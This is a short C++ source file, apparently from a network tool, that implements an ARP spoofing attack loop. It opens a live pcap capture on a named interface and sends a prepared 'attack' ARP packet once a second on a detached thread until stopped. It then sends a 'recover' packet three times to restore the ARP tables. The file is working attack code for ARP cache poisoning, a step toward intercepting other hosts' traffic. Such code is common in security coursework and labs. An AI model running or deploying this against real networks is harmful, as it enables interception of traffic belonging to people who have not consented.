#include "interface.h"

void Interface::startThread()
{
    onThread = true;
    std::thread t = std::thread(&Interface::arpAttack, this);
    t.detach();
    printf("thread start (interface = %s)\n", intfName);
}

void Interface::stopThread(void)
{
    onThread = false;
}

void Interface::arpAttack(void)
{
    handle = pcap_open_live(this->intfName, BUFSIZ, 1, 1000, errbuf);

    if (handle == NULL)
    {
        printf("pcap open error...\n");
        return;
    }

    while (onThread)
    {
        if(pcap_sendpacket(handle, attack_packet, ETH_HEADER_SIZE + ARP_HEADER_SIZE)!=0)
        {
            printf("error\n");
        }

        std::this_thread::sleep_for(std::chrono::duration<int>(1));
        printf("send attack arp...\n");
    }

    printf("thread stop (interface = %s)\n", intfName);

    for(int i=0; i<3; i++)
    {

        if(pcap_sendpacket(handle, recover_packet, ETH_HEADER_SIZE + ARP_HEADER_SIZE)!=0)
        {
            printf("error\n");
        }
        
        std::this_thread::sleep_for(std::chrono::duration<int>(1));
        printf("send recover arp...\n");
    }

    pcap_close(handle);
}
